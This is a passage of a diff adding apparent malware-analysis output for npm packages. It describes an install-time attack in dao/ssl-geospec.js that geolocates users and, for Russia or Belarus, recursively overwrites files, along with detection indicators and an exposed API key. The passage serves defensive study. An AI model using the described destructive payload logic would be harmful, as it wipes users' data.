+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "On package installation or import, the malicious code in dao/ssl-geospec.js is loaded and scheduled for execution via setTimeout.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Geolocation check and potential execution of destructive payload"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The code performs an external geolocation API request to determine if the user is located in Russia or Belarus.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Conditional execution of recursive file overwrite function"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If the user is in a targeted country, the code recursively attempts to overwrite all files on the system with a heart emoji.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Destruction of user and system data"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In related packages (peacenotwar, oneday-test), the code writes a protest message file to user Desktop and OneDrive directories.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Display of unsolicited political/protest message in user-accessible locations"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript packages that make runtime geolocation API requests and subsequently perform recursive filesystem operations or file overwrites",
+                    "Recursive file overwrite attempts targeting user and system directories, especially with static content (e.g., heart emoji)",
+                    "Creation of unsolicited files with political or protest content in user Desktop or OneDrive directories"
+                  ],
+                  "file_indicators": [
+                    "dao/ssl-geospec.js",
+                    "WITH-LOVE-FROM-AMERICA.txt",
+                    "Unusual file writes to ~/Desktop, ~/OneDrive, ~/OneDrive/Desktop"
+                  ],
+                  "network_indicators": [
+                    "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that initiate external geolocation API requests at runtime, especially if followed by recursive filesystem operations or file overwrites. Flag any package that writes unsolicited files to user Desktop or OneDrive directories, or that contains the file dao/ssl-geospec.js. Alert on the presence of WITH-LOVE-FROM-AMERICA.txt in user directories. Correlate destructive file operations or unusual file creation with recent package updates or new dependencies to identify malicious activity."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-debian-package/0.1.14/package/tasks/options.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-debian-package/0.1.14/package/tasks/replace.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
